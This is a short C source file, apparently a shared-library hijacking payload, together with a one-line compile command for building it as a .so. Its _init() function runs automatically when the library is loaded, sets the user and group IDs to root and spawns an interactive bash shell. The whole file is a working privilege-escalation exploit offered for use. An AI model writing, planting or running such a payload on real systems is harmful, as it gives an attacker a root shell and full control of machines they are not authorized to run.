#include <stdlib.h>
#include <unistd.h>

// Compile via: gcc -shared -fPIC -nostartfiles -o <insertlib name>.so so_hijack.c

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -i");
}